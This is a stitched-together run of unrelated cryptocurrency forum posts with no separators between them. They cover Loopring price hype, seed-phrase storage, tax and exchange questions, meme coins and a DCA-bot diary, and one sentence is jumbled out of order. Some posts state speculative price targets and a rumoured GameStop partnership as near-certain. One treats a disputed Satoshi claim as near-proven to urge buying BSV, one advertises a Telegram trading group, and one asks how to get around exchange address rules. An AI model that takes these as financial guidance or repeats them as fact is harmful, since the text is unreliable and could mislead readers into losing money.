 I havent seen a whole lot of people posting summaries of WHY loopring  (LRC) is a ridiculously valuable network on the verge of parabolic  growth () in value, so Im gonna write about why I like the coin.

What is Loopring/LRC?

Loopring is a zkRollup layer2. It allows for high-throughput, low-cost trading and payment on Ethereum.

If  you arent familiar with Ethereum and the massive changes coming with  the merge to ETH 2.0, I highly suggest watching videos from Vitalik  Buterin (Ethereum creator) to understand the technicals (especially with  respect to zero knowledge roll ups, a technology he approves of and  sees outperforming optimistic roll ups in the future) and Raoul Pal  (ex-Goldman Sachs, Founder of Global Macro Investor) to understand the  macroeconomic reasons - especially his videos on the exponential age  which show how ETH 2.0 presents one of the greatest investing  opportunities of our lifetime.

Why,  then, talk about LRC? Because it has the machinations of potentially  being an even greater deal. Because Layer 2 solutions have the ramp to  grow against the Layer 1 so long as they receive ample economic and  developer energy aka network effects from people like us. What does that  mean for LRC built on ETH? Exponential growth compounded on exponential  growth.

What are the BIG things that are coming that will drive this massive growth?

ETH 2.0

* Migration  to Proof of Stake and sharding which will drastically change the  ethereum network to increase bandwidth and efficiency, reducing cost to  use the network.
* Introduction of Staking which has brought multiple financial institutions to the space

So  what? Energy efficient transactions vs. Proof of Work mean sustainable  growth (for the ESG-minded institution), and staking contracts plus the  already low supply create a massive supply shock. This means  for  ETH

Layer 2 for ETH

* Maintains ETH-level security
* Massively reduces cost of transactions
* \^ those things make exponential network growth VIABLE

So  what? Reducing the costs of using the network to near-zero will enable  the next massive wave of adoption. This means  for LRC

Network effects

* The  growth of networks being brought to this space will empower the network  and reward the HODLers. (Hopefully you by now, if not WTF are you  doing)
* Exponential  growth comes from increased size of networks where every node (person)  is empowered by edges/connections (utilities like transactions, NFTs,  etc)
* \^ those things make the exponentially growing network VALUABLE

This means LRC is on the verge of explosive growth

GME partnership

* The rumors from a couple months back, Loopring and GameStop both announcing a big NFT partnership Q4 this year
* Several clues point towards this partnership being real from executive leadership to content on GitHub and Twitter.

So  now, with LRC on the verge of exponential growth just as a Layer 2 for  ETH set up to explode higher during ETHs next bull run where top  analysts are predicting as much as $40k price targets (near 10x growth  from today), we also have this Layer 2 which is potentially sitting on  the absolute biggest hype rocket of apes and video game players (a truly  massive, largely untapped NFT customer) and we have explosive growth on  explosive growth. Forget the moon, apes. Ive seen many posts  suggesting weak price targets such as $30/coin. You truly dont get how  big this is. If ETH is expected to grow at a modest 500% expected rate,  you need to model your price target alongside it. $150/LRC is not  unreasonable or even a meme. (Only $200B market cap of a larger $6T+  potential market which is a common prediction for the end of this cycle)

Remember  that this is a layer 2 solution thats not limited to just this  GameStop partnership. When they bring their gamer and developer network,  when we start to see crossover posts from WSB and other investment/ape  pages, when developers see whats happening here and decide to build  because the people (the network) are there. This makes LRC THE choice  and premier network for Layer 2 solutions.

Power to the players. $150 is not a meme. I like the coin.

Yesterday wifey gave me the good news.   
I was so happy I cried like a child, she followed my reaction as well.  
I still can't cope with it, it's some weird mix of extreme happiness and fear of all the things to come.   
With all that I didn't get much sleep last night and decided I want to set aside some crypto for junior.  
My wife and I are both into crypto and we are now in a position to be able to set aside a chunk of ETH.  
We could add more down the line on the day of birth, future birthdays and so on, but we want to start on the day we found out, just to have it as a memory to celebrate.  
The goal here is to have some money invested that wouldn't be touched untill it's time for college or in case of some life threatening emergency.  
Im not posting this just to share the good news, but actually because I lack crypto knowledge and seek advice.

What would be the best way to keep this crypto safe?  
I don't really trust digital wallets, and who knows how many of them would still be there in 18-20 years.  
Cold storage wallets sound like the answer here, but, I can't really trust a USB ledger to not corrode and still be working in 18-20 years, can I?  
Are there any other options out there that could be considered safe in this scenario?  


Thanks in advance,  
wish you all the best!

If youre reading this, you are likely in the first 100k people to this sub. This sub has nearly doubled in growth in the last week alone. The value of LRC has grown exponentially in that time (remember that fact: as the network grew, the value of the asset grew exponentially).

This is more of a wishful thinking/counting chickens before they've hatched kind of situation.... BUT, has anyone with large/large enough/getting there portfolios considered moving to more crypto friendly countries?

This could either be to work, set up a business or simply to retire and live off of your profits. Ideally, I would stay put, but the capital gains situation in my country will almost halve my profits.

I know it's a bull market, hopium is high and so on, but I've been starting to think that this could become a serious discussion point over the next 5-10 years for me, personally. What does this sub think?

Looks like Seed phrases are a recurring problem most of us have, i know you always wondered what to do with them, how to keep them safe without losing them in the process, here are some of the best options you have:  

1. Memorize it, it could take some time, but if you read it at least 3 times a day, 7 days a week for 3 months it is guaranteed that you'll remember it.  
2.Tattoo it, but not on all on yourself, you should tattoo a word on a different member of your family each with a different tattoo guy.  
3. write it down and stuff it on your pillow! just be careful if you're going to wash it later.  
4. pick your favorite tree and bury it under it, try to dig deep down, it is dangerous if you keep it close to the surface.  
5. Pay a professional seed phrase keeper, they will store them safely for you, there are a lot of those here on reddit, they're always sending dms asking for your seed phrase, very nice people :)  

Hope this could be of help for you guys, if you have other suggestion feel free to add it

Hi,

Traders don't have the tools they need to have better trades, such as using on-chain data when creating an order on an exchange. 

For example creating an order to sell my BTC when whale wallets start selling. that would be useful for many of us when the price was $62k.

Another problem is not buying coin at the right time. If a coin has high social engagement or is just listed in a new exchange, you need to buy it immediately.

 money developing something no one wants!As a start-up from the UK, we're trying to solve many other problems you as traders have and we'd like to talk to you before spending lots of time and

If you have this type of problems please let us know so we can talk about it.

Thank you

Hi guys, I'd like to ask, when there are new cryptos made, how to the creator decides how many tokens are they gonna put out? Is there a direct correlation between the amount and the potential price? I understand, the main factor for the price is probably the feature/goal of the company, but is the amount of tokens also important? 

Also, what are the important factors for consumers to buy certain cryptocurrencies?

PS: It might be a stupid question, but Im still learning crypto. 

Thank you for your answers :)

_"Today is Day 4 of me doing full-time in cryptocurrency as a reddit publisher. Hope I can get support from the community. 5 months 3 days of reserve left for my family and I"_

_"Full Disclosure, I only have 0.3% of Loopring in my portfolio."_

# What is Loopring?

Loopring is an Ethereum-based software platform that intends to reward a global network of users to manage a platform that facilitates the creation of new forms of crypto asset exchanges. Loopring, one of a growing number of decentralized finance (DeFi) protocols, provides this platform by combining different cryptocurrencies, including its own LRC token.

Most significantly, Loopring promises that their platform will enable exchanges built on it to avoid the poor speeds and high prices associated with decentralized exchanges on Ethereum by utilizing a newer type of cryptography known as zero-knowledge rollups, or zkRollups. Loopring claims that with zkRollups, its exchanges can provide traders with speedier settlements. zkRollups allow Loopring exchanges to finish key computations elsewhere rather than directly settling trades on the Ethereum blockchain (as other decentralized exchanges do).

The concept is that by lowering the amount of transactions that a Loopring exchange must submit to the Ethereum network, traders will be able to trade faster and at a lower cost. In contrast, other decentralized exchanges require transactions to be validated by the Ethereum network, which takes minutes rather than seconds or milliseconds.

# The team in Loopring

Loopring's creator and CEO is Daniel Wang. In 2014, he controlled Coin Port, a centralized exchange. During that time, he attempted to remedy the problems caused by centralized exchanges, but concluded that the problems could not be rectified since they were inherent in the centralized exchange concept. This resulted in the conception and subsequent creation of Loopring. He was previously the co-founder and vice-president of Yunrang Technology, as well as a Google Tech Lead.

Loopring's CMO is Jay Zhou, who previously worked in Paypal's Risk Operation Unit and was also hired by Ernst &amp; Young. He was also one of the primary founders of SJ Consulting.

Steve Gou, Loopring's CTO, is the third member of the core team. He collaborates closely with Brecht Devos, the project's Chief Architect.

# Competition

0x appears to be pursuing the same goal as Loopring, yet there is a significant distinction between the two. Whereas 0x allows anybody to build a node as a decentralized exchange, and all orders are handled off-chain but settled on-chain, 0x only receives liquidity from exchanges that have been built on the 0x platform. This is in stark contrast to Loopring, where liquidity is provided by any exchange that links to the Loopring network. Other competitors include Kyber Network, Blocknet, and Bancor. There are liquidity pools and order matching in Kyber Network and Bancor that ensure deals are met across smart contracts, while Blocknet functions in a similar method but just with order matching. There is no rival who can provide the ring orders generated by the Loopring protocol's ring matching.

# Conclusion

Loopring distinguishes itself from other decentralized exchanges through the use of ring-matching and ring orders, and as they continue to develop ring-matching, we may see an even bigger boost in market liquidity when three or more orders are paired. Furthermore, Loopring's order sharing model outperforms standard order matching by allowing for more flexible purchasing and selling.

Loopring's blockchain agnostic adaptability is perhaps one of its most significant advantages. As long as a blockchain incorporates smart contracts, it can connect to the Loopring network, allowing orders to be fulfilled through several channels. Unfortunately, Loopring has halted this portion of the project. Decentralized exchanges should see more adoption as Loopring adds liquidity and levels the playing field, and Loopring will benefit from additional exchanges joining the network.

Asking from the UK. A UK friend of mine has $30,000 of stocks with a broker in the US. Hes not delved into the world of crypto yet but is interested. 

He wants to sell his stocks and send the money back from the US to the UK. We were wondering whether he would get a better exchange rate If he sold his  stocks for USD, then bought a cryptocurrency in the US &amp; then sent it to a UK Coinbase account. 

As far as I know the biggest limitation is that the US regulators require you to have a US address in order to buy crypto in the US. Does anyone know how you can safely buy crypto in the US without a residential address? 

The other question is about money laundering? Would any regulators be concerned about this activity - would it flag up? Obviously theres no money laundering going on, its just moving assets around efficiently.

I noticed that some (shit)coins don't show the dollar value on my trust wallet and I'm wondering if I can fix this.  It really happens only with unknown shitcoins that I randomly bought.

So I see the number of that shitcoin but not the dollar value. 

Anyone knows how to change that?

Before I begin, completely new to this. Started 2 weeks ago slowly, while doing TONS of research online, tools,  including going over several help/guide posts on here. A lot was helpful, but I'm still not able to find right solid answers for what I'm about to ask. 

I decided to start investing in Crypto (with money I can afford to lose), and my main goal isn't long term, except for kinda stable coins..

I've set up my portfolio and invested in a couple of coins based on the knowledge i've gotten through my research.. My top 2 questions are about: Choosing Altcoins, what factors to look at for analyzing performance &amp; how to analyze/predict prices for limit orders. 

&amp;#x200B;

**1)  Choosing Altcoins: What to look for?**

I'm talking about new, unknown, meme coins etc... what do you usually look at, and calculate, that makes you decide that THIS COIN will shoot!?

**2) Analyzing prices on order books, to predict right price limits**

Say I chose to look at a coin and it's past 24h/7d prices to figure out a ballpark range to buy. Lets take Loopring LRC for example now is @ $1.383 - 1.48  , and reached $0.9 - 1.0 (24h ago). 

I see Asks/Bids with different prices.. but how do you mainly indicate if you should wait, or set a lower price, or go for it hoping you'll miss your chance? I looked at guides and videos on Depth analysis, but still not understanding it right as a newbie in this. 

&amp;#x200B;

any advise would be great. thanks

Looks like this is that time of the year again.  All  those coins which were going sideways, are waking up and pumping hard. Here are some strategies you might want to keep in mind during this period:

The best strategy in this bull run would be to FOMO into the pumping coins that is most hyped up in this sub. By the time you get in, it will be at its all time high. Put a large chunk of your money in it. As soon as you buy it, it will start going down.  When it goes down considerably, panic sell it at a significant loss. Then go to the daily thread and look for the next hype. FOMO into that coin at its ATH. Rinse and repeat this process. 

Remember, do not do any kind of research or try to understand their fundamentals and tockenomics of these project.  Never hold anything for a long time. If you accidentally hold some project with strong fundamentals long enough, you might become rich.

Always remember to buy high and sell low. Enjoy the ride.

Hi,

My name is Tom and I'm a crypto enthusiast. I've been in the crypto space for 3 years and my aim is to help people understand cryptocurrency and blockchain technology better.

Many people think that all you need for a successful cryptocurrency investment is to buy the right coin and hold it until your prediction comes true. I want to show you how wrong this strategy is and what actually works.

I have made a telegram group for people to ask questions and help to teach people how to look for the signs that they would normally miss. (Cryptovibez1)

If you are a new investor in crypto looking for an easy way to learn the basics of trading and investing, this is the perfect place for you.

In this group, we will be discussing everything from technical analysis, chart reading, buying/selling strategies as well as any other trading or investing related topics.

Hope you have a great day and safe investing.

The sub has been flooded with meme coin stories lately but Im curious how many of you here actually had your biggest gains from memecoins. I like to think some of those big gains come from solid projects that blew up, but who knows? I think this will give newcomers a realistic view of what the average crypto investor experiences, and what they can expect to see in crypto. 

For me: Ive dabbled in memecoins like DOGE but my biggest gains have come from DOT. I bought a bunch around 11 USD so Ive done almost a 5x my initial investment now.

Meme coin. A joke. A laugh. Not a serious investment; not something with good tokenomics or anything relevant like that. Yet Doge and Shib sit pretty at 9 and 10 while world changing technology like Monero capitulates at 40?

You literally cant sell this shitcoin. Its based on a viral tv show thats making the rounds past few months, pumps by sickening amounts only to drop 99.99%. Laughed at by the entire community to pump 300% again the next day. 

If any coin is one big pisstake, one big laugh at the irrationality of this current market, it is Squid Game. It should show you all how funds are currently being BADLY misallocated. 

Squid game is the perfect meme coin, and its rise is yet more evidence that we are living in a bubble. True decentralised open source tech is being left behind here for literal crap that you cant sell, this is no rational market

Hypothetical example:

-Buy 1 BTC on Coinbase.
-Read XMR Whitepaper and get excited. -Transfer .25 BTC to CoinEx
-Exchange .25 BTC to XMR on CoinEx (XMR not available on Coinbase)
-Decide its annoying to have too many wallets (as an aside: could someone recommend a good iOS wallet with iCloud backup where coins can be kept off all exchanges, ie to store rather than trade coins?)
-Exchange XMR back for basically .26 BTC
-Transfer .26 BTC back to Coinbase
-5 years later, exchange 1.01 BTC for ETH and USD after exchanging first to private wallet for storage then to another exchange (ie Kraken) to stake Ether and because USD needed to buy a rooster. 
-Prior to acquiring any cryptocurrency, person established Bona Fide residence in Puerto Rico and as such is exempt from US Capital Gains reporting or taxes under IRC 9.39. 

Questions:
(1) It appears Coinbase will no longer issue 1099-Ks but only 1099-MISC for rewards etc. Does Coinbase report to the IRS the transfers to CoinEx?
(2) Does CoinEx report the de minimis gain or issue any tax form to the IRS or Hacienda (PR)?
(3) Is interest earned from staking ETH US-Sourced in a US Pool income under IRC 9.39 if person is bona fide resident of PR and remains so? Do pools send 1099-INT?
(4) Are there any other tax consequences of the above set of hypothetical circumstances?

Thank you very much.

I currently have about .115 of a Bitcoin, roughly $7.2k at the time of writing this post. From a bag holding view of things, should I hold this amount as Bitcoin floats around near ATH levels or convert half of it to get 1 full ETH, which is roughly $4.5k at the time of writing.

From my view of things, Bitcoin is currently on its throne and will still hold most dominance of the market, however I believe (or would like to) ETH is just getting in its groove and could at some point reach Bitcoin levels of pricing at at-least 30-60k in the next year or so. 

I know all decisions are my own, but I would very much like to hear varying opinions on this change to my portfolio. Please help. Thanks in advance!

I live in a town about 35 mins from Detroit, MI and there are TONs of gas stations around with Bitcoin ATMs inside and a few local stores/restaurants that accept certain cryptos in my area. Its promising to see as we are still, in my opinion, in the very early stages of adoption. Also Walmarts in the area will be installing BTC ATMs soon according to one of their managers. 


Plenty of businesses advertise on the COIN app in my area as well, which is the app of the token XYO (recently listed on Coinbase). 

What are you seeing in your areas as far as adoption that gives you hope for the future of crypto??

I'm sure this has been asked before so I'm sorry if this question is a common repost, but:

What exchanges allow you to withdraw your crypto directly to an Ethereum L2? Does this help save on gas fees? I'm looking for Polygon, Arbitrum, or Optimism. 



Thanks! I'm now just filling the space to hit 500 characters. Crazy run LRC is having. I really wonder where this one will tap out. MANA as well, have you guys bought into the metaverse tokens/coins? I haven't actually tried the protocol out yet, but it does seem interesting. Hopefully this question isn't too annoying. I'm trying to mess around with Defi on L2 to avoid the gas fees that everyone hates so much. Alright thanks again

I am quite new here but since I joined this sub I've been enjoying my time. I've learned a lot about crypto, I've encountered friendly users and have discovered Moons which are pretty exciting. Not to mention lots of practical security tips. I also really like that this is a fast sub so there's always lots going on - new posts all the time and I when I comment I get instant interaction from others. I see that the number of members just keeps growing so fun times ahead. 

What about you - what do you like most about this community?

The one thing that holds me from putting all my money into crypto.com with USDC or some other liquidity provider to earn that sweet 6-12% APY, is the risk of the backing bank having some problems and losing my money (there is always a small risk factor right). But what if you diversified that risk through getting some kind of insurance for the locked money? Do you guys know if there are insurance products like that, that would be affordable inside of a 6-12% APY? So less risk (as the bank should not be correlated to the insurance fund) for less income but a good alternative for some people.

I'm honestly speechless. It was an obvious scam/rug pull from the beginning (read the white paper if you haven't already, it gave me a good laugh), and yet it's up 361% in 24 hours according to coinmarketcap, despite the fact that you still can't sell it for a profit. 

Some people will never learn, they'll chase the FOMO, chug the Kool aid, and light themselves on fire while they're still recovering in the burn unit from chasing the previous pump.

Don't be like these people, come up with a strategy and stick to it, use limit order if it makes it easier for you. Happy trading everyone. 

TL;DR do your research before you buy into a project, not after. This seems to be becoming less of a norm in crypto.

Recently, we got the first user (u/SamZFury) breaking the mystical 1m barrier, joining u/TheMoonDistributor in that lonely category.

With todays moon distribution, there's 5,490,000 Karma gained by users. At a karma-to-moon ratio of 0.2886, that's 1,58 million moons to be spread around this communities users. Quite possibly, not all of those will be claimed. 

Currently, u/TheMoonDistributor "only" holds 1003579 moons. Once this distribution starts, it will lose it's Leviathan status, leaving us once again with only one Leviathan.

Being at the top is a lonely place.

I started investing in crypto like 2 months ago, attracted by the fuzz around the meme coins like shib. I made a small profit with shib (still riding the wave with a couple of mil) and invested the profit on ADA. I can afford investing like 50-100 a month in crypto, but what's the best strategy? Go all in the project i believe the most and go for the long run or just tryinng to keep up with the market and go from project to project chasing small profits? 
Everyday we see different coins pumping and i always feel like im missing out, but i also don't want to FOMO into something and just lose money. 
Usually im against putting money in lottery tickets and call it an investment, but just like i did get profit with shib, many people can get stupid rich with meme coins and small tokens. I just don't know the way to go from here

As many people are now joining crypto currency or  even the people who have been here for a long time we all want to safe and secure with out funds. And today i will be sharing a few tips about said topic.

1-wallets: creating wallets is easier then you think and there are many wallets from unknown sources. Use only the wallets you can trust and know there source. For example algo wallet.
2-In crypto space everyone has an opinion and everyone wants you to buy what there buying so they push the price up. Please if your looking for value and investing do your own research.

3. There is a saying not your keys not your crypto storing your crypto on an exchange is a risky play because exchanges gets hacked and you don't own the keys. Exporting your crypto to a ledger wallet(cold wallet) keeps your crypto safe from cyber attack or an exchange being shutdown ,I'm referencing sketchy ones.

4. Don't use any exchange use trustable ones because  like the turkish exchange that stole everyone money that could be you.

5.dont keep  all your crypto in one place not even a nano ledger because anything could happen.

6. Write down your seed phrases on a paper and hide that paper in a safe or somewhere secret those phrases are your security. Don't share your phrase with anyone .Especially not a Nigerian prince

So CoinGecko has this feature called Candies, which you can redeem daily each time you log in (logging in is not enough, you have to actually claim them). You can do this both on the app or on the website. Unless you are a total freak, you probably already open either CoinGecko/CoinMarketCap every 2 minutes to look at the same charts, so why not make the best of it by claiming some rewards?

The candies you get increase with your daily streak of claims, up to a maximum of +100 candies on the seventh day, and then it resets. This makes it possible to earn a total of 310 candies per week if you open the app every day without breaking the streak (+10, +20, +30, +40, +50, +60, +100).

Now let's take a look at the rewards, because there a few sweet ones especially considering you get them for free. I'll also add the minimum number of days you have to be in a streak to claim each reward ASAP.

**Free** **Books**

* How to DeFi: Begginer - 800 Candies - 2 weeks and 6 days
* How to DeFi: Advanced - 800 Candies - 2 weeks and 6 days
* How to DeFi: Bundle (Begginer + Advanced) - 1400 Candies - 4 weeks and 6 days
* How to Bitcoin - 800 Candies - 2 weeks and 6 days

**Discounts**

* 10% off on CoinGecko merchandise - 800 Candies - 2 weeks and 6 days
* 50% lifetime discount on [PrivadoVPN](https://privadovpn.com/) Yearly Plan - 300 Candies - 1 week
* 10% off on first [CoinTracker](https://www.cointracker.io/) tax plan - 300 Candies - 1 week
* $5 off on [ELLIPAL Titan](https://www.ellipal.com/) Cold Wallet - 200 Candies - 6 days
* 25% on [Benzinga Pro](https://pro.benzinga.com/) Subscription - 300 Candies - 1 week
* 40% off [IntoTheBlock's](https://www.intotheblock.com/) Annual Subscription - 300 Candies - 1 week
* 20% off Delphi Digital Monthly/Annual Subscriptions - 300 Candies - 1 week

And many more! Such as discounts on Ivacy VPN, CryptoQuant, Surfshark, Accointing, PureVPN, ExpressVPN, Chain2Frame, Zen Ledger, BlockPit, Shieldfolio, The Block, NordVPN Teams, Travala, LockTrip.

In the past there was even a 10% discount on Trezor Products for only 150 Candies but it has been already fully redeemed.

You can check out all the possible rewards in [this link](https://www.coingecko.com/account/rewards). I figured everyone loves free stuff, and why not make something out of our obsession with looking at charts?

Have a good week everyone!

I am having trouble with trust Wallet not showing my token balance. So I went to Bsc Scan, just to check my address. I just found out that I have many tokens that I didnt purchase. I see AIR, FLUX, MNEB. Something called tu7.org and finally something called zape.io. US$ balance for those tokens are in 0.00 the amount of token is millions.

I still cant see my balance on the app, I cant swap my tokens to Bnb, is like they are on the blockchain but they are not available on my wallet. 

So my questions are: do I have to be concerned? Is this normal, to suddenly have tokens that I didnt purchase? Why those tokens have a balance in US$0 but have a maker price? Is it safe to click on those tokens to see where did they come from and when? Is this a scam airdrop or something  thanks a lot for your help. And lastly English is not my first language, so sorry for all the mistakes you will find.

So recently I heard of the ArbiSmart Network for Arbitrage ([https://arbismart.com/](https://arbismart.com/)). They claim to be listed on big exchanges soon and grown a lot in the recent months/years. But information about their plans, how it works and their claim to be EU regulated is pretty vague and that's a red flag. Also the articles I read about it seem to be biased and/or sponsored by them. Are there people out there who use it and can tell if it is scam or actually a useful product with potential? Are there valid sources to get information about it?

  set up Binance a few months ago and forgot about it. Went with Coinbase instead as it had the quizzes to earn free crypto.

I forgot about my finance until today. I logged in and there's 10 SAND worth $28 in there from roughly a month ago.

Is this likely to be dusting as I'm pretty certain I didn't buy it?

Filler for 500: I've seen dusting posts here previously but it's normally for random small amounts like 0.0025 ADA  or small enough for the scammer not to be losing money. $28 seems like a lot to send through for a scam. Maybe someone sent it to the wrong address by mistake? If so is there any way to find out who and potentially return it? No I'm not going to send it to any random redditor who asks, even if they promise me 2x in return or they're a nigerian prince who is related to me.

I hear news on this sub of crypto adoption here and there and slowly I'm starting to get scared for my country. 

I have seen no shop which accept crypto, ever. Am I alone in this?   
For my cryptocurrencies are an investment to get out of poverty and one day own a house to call my own. Yet, it is supposed that crypto rises with adoption. 

Right now I have never never never seen cryptocurrencies being used as currencies in a physical space. Only online. More and more people are speaking about crypto currencies and a lot of people are saying they want to start investing but a lot of them are here just to specualate. 

So I need you. Yes you the reader. Can you tell me if there are examples of adoptions around you and then tell me about the business that accept cryptos. 

I wish spending crypto wasn't about Lambos but more about groceries !

Everyone loves a HODLer but at some point profits have to be taken so what's your endgame?

Let's imagine the coins you own haven't just mooned but have gone superluminal to another galaxy. You're now richer from 1 year of being in crypto than your job would pay in the next 10, 20 heck maybe even 30 years. Your moonshots paid off and then some.

Are you HODL'ing until BTC/ETH reaches a certain level? Or till the entire crypto market reaches X trillion?

I have a relatively thin portfolio in terms of coins with ETH taking up a big chunk. Looking to keep ETH for the long term but tempted to sell my other cryptos near the end of this year if we go parabolic.

Everybody's endgame is different of course depending on circumstances. Just curious to hear some views on at what would be the dream scenario where you could sit back and reap your rewards or at least most of them and keep some skin in the game.

Hello all, I hope you're keeping well. Last week I posted my first thread as I took a jump into the world of DCA bots which you can find here:
https://www.reddit.com/r/CryptoCurrency/comments/qg5htm/i_tried_dca_bots_for_a_week_why_i_decided_to_try/


The first week of testing with what would be considered a smaller bankroll in the scene netter me $141.99 in profits when completed.


This week came with bigger profits but some hard lessons too. I did say I'd post the negatives involved and that's what this update will somewhat cover.


Before I give the day by day, I will admit, I got very greedy. Shib started to get a lot of attention which meant my Shib bot was opening and closing deals many times faster than other bots. I decided to take advantage of this by diverting the majority of my bank roll into these bots alone, and then other bots that picked up the pace after. What ended up happening is, once the hype died down I was left with a lot of funds that were locked in deals I couldn't close.


**Day 8 - Profit: $103.57**

This was my best day to date due to Shib pumping hard, about halfway through I increased the buy order and safety orders from 10/15 to 50/100 which seemed to work really well short term. I actually kept turning the bot off in between trades because I was terrified it was going to get dumped hard.



**Day 9 - Profit: $75.69**

Shib continued to do well for trading. I actually created 3 Shib bots and broke up the investment to try to give me an easier way out if it all went tits up as I could cancel two bots and take a loss and leave one long term, it was still an amazing day profit wise but at this point greed had taken over and I was becoming reckless. 


**Day 10 - Profit: $55.49**

At this point, Shib wasn't as volatile, but I had such nice gains the last two days that I was like Phil Mitchel from Eastenders when he went through is crack addiction phase. Harmony ONE was trading pretty well so I decided to put a lot of my funds into this bot, I justified it by telling myself that I didn't mind holding ONE long term, but the nature of this experiment is to try to make constant passive income, all logic went out the window and ONE did ok, for a while...


**Day 11 - Profit: $28.04**

At this point I knew I had fucked myself a bit I had turned off the Shib and ONE bots, but they were still stuck in deals. Matic was doing ok so I went for a slight increase of funds on that, nothing like before. At this point I realized that this was not passive income. I was worrying about my bad decisions, I was constantly checking it to see if it moved and all in all I wasn't enjoying the experience. I had about a third of my bankroll locked up now and if the market crashed I wasn't covered to eat the dips. bad times.


**Day 12 - Profit: $18.72**

Another day where I couldn't shift my red bags, the days over profit over $50 seemed so far away, I just wanted to get back to about $25. I actually stopped looking at the bots all the time because it was making me feel bad and served as a constant reminder that my greed was punishing me.


**Day 13 - Profit: $11.25**

At this point I knew that I had to turn off all my bots, wait for them to close deals and start a safer strategy. The Shib deals had finally closed. I sat down for two hours and looked at coin charts. I created 16 bots that had been designed for low bank roll accounts using a maximum of about $250 per bot with 60% drop coverage. I was slightly over risk with this setup, but it meant my losses if the market crashed would be minimal and I could recover. I didn't turn them on yet, I wanted my other bags to clear.

**Day 14 - Profit $19.06**

Still not the best day, but at least my profit was starting to rise again. Most of my older bots closed their deals and I was just left with Matic and ONE which were taking up a little under $1000 together with Matic showing some signs of recovering (this was yesterday and it closed the deal today). I was happy enough to turn on my less sexier but very safe bots. It was a bit of a slow day for my pairs in general but I can sleep well knowing I'm covered and working my way back up to making some good ROI.





**Weekly/Total Summary.**

Total profits this week: $311.82
Total profit since start (2 weeks): $453.70


So it looks like I had a really great week when you just look at the bottom line, but the reality was that if the market had tanked on any of these days I would have been stuck in limbo, unable to DCA down and potentially not clear any deals for a very long period of time. I was very lucky that I had a chance to close these deals and get out. It is easy to fall into the greed trap and be blinded by it. If you're thinking of getting into DCA bots, please learn from me and remember that smaller but consistent profit will eventually beat going in hard on one pair that you might get locked into for a long time.


If you have any questions, as always feel free to ask in the comments. You can PM me but please remember to never give away any personal information regarding you or your wallets, assume everyone is out to rob you.

Hi guys,

I usually don't write over the internet but now I am about to invest 10k-20k in cryptos and would like to hear some thoughts.

As you all are aware, there is a high probability that the alt coins will get bullish in the next few weeks/months. I also read somewhere that next the MC in crypto will overpass the stocks so I guess a lot of stock investors will invest tons of dollars in cryptos.

Therefore, I would like to read some of your projects that you believe: 1-2 senteces about the project, why you invested and where do you think it will go in the next 12 months.

Please hit the like button so everybody can see this.

Thank you!

 This is absolutely amazing.

We have a man that is going all out to prove he is Satoshi, in trial, right now. There are guys like Andreas Antonopoulos and Gavin Andreas in attendance.

The man claims to have all the evidence to prove he is Satoshi, and it will come out during this trial.

But why is he in court? Why is HE getting sued?

Because another person says his brother worked with him to create Bitcoin.

So basically, both parties AGREE and KNOW that this man created Bitcoin and holds 1.1million BTC. The case is whether the brother is entitled to 50% of those 1.1million.

What is even more amazing, is that 99.9% of people in crypto think this man is a fraud. Yet, it's all coming out in court as we speak, and no one is aware of it.

The other bombshell is, if he DOES prove he is Satoshi and wins the court case, and he DOES have access to the 1.1million Satoshi coins, he has pledged to sell all of his BTC for none other than BSV - which stands for Bitcoin Satoshi's Vision.

BTC is over $1 trillion. BSV is a measly $3billion.

This has absolutely massive implications for Bitcoin and crypto in general.

BSV price is currently $170. 

What if, just what if, this is all actually true? And this man actually IS Satoshi?

Imagine being able to buy Bitcoin at $170. It's one heck of an opportunity.

Keep your eyes open people!

ANYTHING can happen in crypto!

I have this friend who asked me what I do for a living and I said "crypto". 

From there we talked about how I make money in crypto, mostly through "staking, holding, farming," and all that. 

And he was interested and asked how much he should start with and I said as much as you can put away for at least 1 or 2 years without touching it.

The dude said he will start with $300 the next day. It's been almost 2 months now and several missed buying appointments. 

The first excuse was the price is still high, then there was a dip, he said he wants to wait for the price to drop more, then the money was diverted, today he's "concerned" about how to cash out. He's literally playing hard to get with something that clearly is to his own benefit.

The point is, this dude does not know that I have no direct benefit from his investing in crypto, and in reality, I'm actually "begging" him to make money. 

If you continue to press him to take the bold step it will begin to look like there's something in it for you, and if you stop, you're going to watch your friend miss out on many good opportunities. Furthermore, if you press him hard enough, and he invests and things go south, he will most likely blame you.

I'm sure you too have similar experiences, how do you deal with them?

NFTs should include handwritten scripts, photos, and exclusive audio takes from the movie. When the extremely accomplish director/producer Mr. Tarantino releases his unique digital assets late 2021 get ready for the most explosive part of this cycle, the feeling in the space is that now many others whom were previously reluctant to learn for fear, now they will be releasing their own proprietary media as non fungible tokens and the hoards of "super fans" around the world are going to dive deep into this space. 
Thank you Quentin Tarantino, strap on mates.

Chasing pumps is the worst thing you can do, because there will always be a coin you dont hold that is pumping right now. Get used to it and stick to your gameplan!

No one would have known for sure that LPR, SOL, Metaverse coins, or heck, even SHIB would pump. The worst thing you can do right now is throw all your money at it. You cant predict how high it will go. Timing the market is impossible.

Its clich but true: pick some solid projects you believe in, DCA, and stick to your plan. Watch out for FOMO and get used to coins you dont hold that is pumping right now. You cant hold them all.

I am trying my best to change my financial situation. 

For a bit of context, my partner and I have 4 kids. I work full time and usually make around 40k. My partner had to give up her job after kid 3 was born as childcare costs were the equivalent of her monthly wage.

We have hit a patch of bad luck where I am off work as I have herniated disks in my lower back. I am currently on sick pay which is a 25% reduction (I know its still decent pay for being off) but that reduces my wage to 26k as I can't work any OT.
My partner has postnatal depression so is currently unable to return to work.

I've stated before here I have around $700 worth of crypto. I really dont want to sell it as I think i will regret it in 5/10 years time. But I'm getting to the point where I'm behind on bills and have no idea when I can go back to work (have an appointment with a consultant tomorrow ).

The money I have in crypto won't even cover the bills I have building up. Is it worth selling it to still not have any money? 

Anyone else in or been in a similar situation?

If so, how did you navigate it? How did you get back on your feet?

Any suggestions/advice are very welcome!

Thanks

In the last couple of days, I have basically doubled my portfolio, but if I didn't take profits, I would have 10x'ed my portfolio and retired. I put my entire bank account in small cap altcoins with a lot of potential and it worked.

But if I didn't take any profits, I would have retired now. Of course I could not know what was going to happen, so I took profits too fast, in case it would crash.

I don't know what would be worse: Taking profits and then watching it continue to pump or not taking profits and watch it go back down to where you bought it.

But what's a good profit taking strategy that you don't screw up all your gains and also minimize your losses?

**Btw, I am not complaining about doubling my portfolio in a couple of days, but I did miss out on another 5x or so by taking too much profit too fast**

